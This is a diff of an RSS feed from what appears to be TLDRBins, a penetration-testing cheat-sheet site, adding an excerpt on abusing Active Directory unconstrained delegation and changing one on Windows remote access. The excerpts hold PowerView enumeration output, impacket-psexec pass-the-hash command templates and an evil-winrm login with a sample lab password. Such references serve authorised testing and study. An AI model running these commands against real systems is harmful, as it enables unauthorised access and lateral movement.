@@ -6,13 +6,21 @@
     <description>Recent content in Psexec on TLDRBins</description>
     <generator>Hugo</generator>
     <language>en-us</language>
+    <lastBuildDate>Sat, 23 Nov 2024 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://tldrbins.github.io/@psexec/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Unconstrained Delegation</title>
+      <link>https://tldrbins.github.io/unconstrained_delegation/</link>
+      <pubDate>Sat, 23 Nov 2024 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/unconstrained_delegation/</guid>
+      <description>Abuse #1: Capture Ticket Windows 1. Check TRUSTED_FOR_DELEGATION . .\PowerView.ps1 Get-DomainComputer PS C:\programdata&amp;gt; Get-DomainComputer ...[SNIP]... logoncount : 131 badpasswordtime : 12/31/1600 4:00:00 PM distinguishedname : CN=SRV002,CN=Computers,DC=Example,DC=local objectclass : {top, person, organizationalPerson, user...} badpwdcount : 0 displayname : SRV002$ lastlogontimestamp : 11/23/2024 2:29:01 AM objectsid : S-1-5-21-422340810-923920092-1608110645-1103 samaccountname : SRV002$ localpolicyflags : 0 codepage : 0 samaccounttype : MACHINE_ACCOUNT countrycode : 0 cn : SRV002 accountexpires : NEVER whenchanged : 11/23/2024 2:26:27 PM instancetype : 4 usncreated : 16398 objectguid : e54dc358-b87f-49ad-8bcf-2029bf051006 operatingsystem : Windows Server 2019 Standard operatingsystemversion : 10.</description>
+    </item>
     <item>
       <title>Winrm</title>
       <link>https://tldrbins.github.io/winrm/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/winrm/</guid>
-      <description>Psexec Password Hash # Domain auth impacket-psexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # Local auth impacket-psexec &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # Domain auth impacket-psexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; # Local auth impacket-psexec &amp;#39;&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; Evil-Winrm Password Hash Kerberos crt &amp; key evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; $ evil-winrm -i 127.0.0.1 -u dr.zaiuss -p &amp;#39;qwe123QWE!@#&amp;#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.</description>
+      <description>Psexec Password Hash # Domain auth impacket-psexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # Local auth impacket-psexec &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # Domain auth impacket-psexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; # Local auth impacket-psexec &amp;#39;&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; Evil-Winrm Password Hash Kerberos crt &amp; key evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; $ evil-winrm -i 127.0.0.1 -u dr.zaiuss -p &amp;#39;qwe123QWE!@#&amp;#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.</description>
     </item>
   </channel>
 </rss>
